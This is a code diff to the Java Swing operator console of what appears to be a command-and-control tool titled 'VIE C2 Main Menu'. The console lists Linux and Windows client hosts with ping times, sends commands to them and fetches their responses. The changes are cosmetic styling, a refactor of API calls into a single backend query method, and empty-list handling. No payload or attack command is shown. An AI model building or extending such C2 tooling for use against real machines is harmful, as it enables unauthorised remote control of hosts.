@@ -8,17 +8,15 @@ import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.FileReader;
 import java.io.IOException;
-import java.lang.reflect.Array;
 import java.util.*;
 import java.nio.file.*;
-import java.util.stream.Stream;
 
 public class MenuForm extends JFrame { // Make sure Class extends JFrame
     private JPanel menuPanel; // Manually create this JPanel object and link it in the swing form editor
+    private JPanel buttonPanel;
     private JTextField commandText;
     private JButton sendAllButton;
     private JList<String> hostList;
-    private JList<String> readList;
     private JList<String> responseList;
     private JButton deployButton;
     private JButton sendSelectedButton;
@@ -60,7 +58,7 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
         ToggleMap.put(1, linuxHostNames);
         ToggleMap.put(2, windowsHostNames);
         setContentPane(menuPanel); // Set the content pane to the panel object you manually created
-        setSize(900, 500); // Sets size
+        setSize(900,500); // Sets size
         setLocationRelativeTo(null);
         setTitle("VIE C2 Main Menu"); // Title
         setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/resources/SwaminHolder.png")));
@@ -75,6 +73,14 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
         osToggle = 1;
         UpdateListLoop();
         LoadSaves();
+        // Values I can't set with the UI editor
+        menuPanel.setBackground(new Color(25, 25, 25));
+        buttonPanel.setBackground(new Color(25, 25, 25));
+        hostList.setBackground(new Color(25, 25, 25));
+        responseList.setBackground(new Color(25, 25, 25));
+
+
+        // Events
         addWindowListener(new WindowAdapter() {
             @Override
             public void windowClosing(WindowEvent e) {
@@ -196,10 +202,11 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
             String hostName = IDHost.get(value);
             String entryValue = AliasHost.containsKey(hostName) ? AliasHost.get(hostName)+" | "+(String)hostName : (String)hostName;
             //System.out.println("IP: "+(String)value+", Contains: "+IPAlias.containsValue((String)value));
+            setFont(new Font("Terminess Nerd Font", Font.BOLD | Font.ITALIC, 18));
             setText(entryValue+": "+lastPing);
             //setIcon(new ImageIcon(getClass().getResource("/resources/"+ico + ".png")));
             setIcon(new ImageIcon(new ImageIcon(getClass().getResource("/resources/"+ico + ".png")).getImage().getScaledInstance(20, 20, Image.SCALE_REPLICATE)));
-
+            //JLabel curLabel = (JLabel) super.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);
             if (isSelected) {
                 setBackground(list.getSelectionBackground());
                 setForeground(list.getSelectionForeground());
@@ -213,6 +220,7 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
     public class ResponseListRender extends DefaultListCellRenderer {
         @Override
         public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {
+            setFont(new Font("Terminess Nerd Font", Font.BOLD | Font.ITALIC, 18));
             setText(IDHost.get((String)value)+" | "+value);
             if (isSelected) {
                 setBackground(list.getSelectionBackground());
@@ -291,7 +299,7 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
                 new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                 return;
             }
-            String resp = apiHandle.GetInfo(hostList.getSelectedValue(),osToggle);
+            String resp = apiHandle.queryBackend("GETINFO", hostList.getSelectedValue(), osToggle);
             if(resp.equals("1")){
                 new CommandOutputForm("No response");
             }else {
@@ -307,7 +315,7 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
                 new CustomDialog("No value selected!", "Something went wrong!", "Warning.png");
                 return;
             }
-            String resp = apiHandle.FetchResponse(responseList.getSelectedValue(), osToggle);
+            String resp = apiHandle.queryBackend("FETCHCLIENTRESPONSE", responseList.getSelectedValue(), osToggle);
             if(resp.equals("1")){
                 new CommandOutputForm("No response");
             }else {
@@ -334,25 +342,30 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
         }
     }*/
     private void UpdateList() throws IOException, InterruptedException {
-        String[] idPingList = apiHandle.findClients(osToggle).split("\n");
+        String[] idPingList = apiHandle.queryBackend("FINDCLIENTS", "", osToggle).split("\n");
+        if(idPingList[0].equals("None")){ // No hosts
+            String[] empty = {};
+            this.responseList.setListData(empty);
+            this.hostList.setListData(empty);
+            return ;
+        }
         String[] sortedPingList = new String[idPingList.length]; // Curious case, we have to sort this array based on the alphabetical order of the associated host names
-        String[] idResponseList = apiHandle.findClientResponses(osToggle).split("\n");
-        //ArrayList<String> selections = (ArrayList<String>) hostList.getSelectedValuesList();
+        String[] idResponseList = apiHandle.queryBackend("FINDCLIENTRESPONSES", "", osToggle).split("\n");
         for (String id : idPingList) {
-            if(!IDHost.containsKey(id)){
-                String hostName = apiHandle.GetHost(id, osToggle);
+            if(!IDHost.containsKey(id)){ // If a new host is introduced
+                String hostName = apiHandle.queryBackend("GETHOST", id, osToggle);
                 HostID.put(hostName, id);
                 IDHost.put(id, hostName);
                 this.ToggleMap.get(osToggle).add(hostName);
             }
-            int lastPing = Integer.parseInt(apiHandle.GetLastPing(id, 3));
+            int lastPing = Integer.parseInt(apiHandle.queryBackend("GETLASTPING", id, 3));
             IPPing.put(id, lastPing);
         }
         Collections.sort(this.ToggleMap.get(osToggle)); // Sort this list for the NEXT iteration
         ArrayList<Integer> takeList = new ArrayList<>();
         for (String id : idPingList) {
             int takeIndex = this.ToggleMap.get(osToggle).indexOf(IDHost.get(id));
-            if(takeList.contains(takeIndex)) {
+            if(takeList.contains(takeIndex)) { // If two hostnames are the same
                 int i = 1;
                 while(takeList.contains(takeIndex+i)){ // Keep incrementing until you find an empty entry
                     i = (i+1)%((ToggleMap.get(osToggle)).toArray().length);
@@ -372,7 +385,12 @@ public class MenuForm extends JFrame { // Make sure Class extends JFrame
             }
         }
         hostList.setValueIsAdjusting(false);*/
-        this.responseList.setListData(idResponseList);
+        if(idResponseList[0].equals("None")){ // No hosts
+            String[] empty = {};
+            this.responseList.setListData(empty);
+        }else{
+            this.responseList.setListData(idResponseList);
+        }
         this.hostList.setListData(sortedPingList);
     }
     private void UpdateListLoop() {
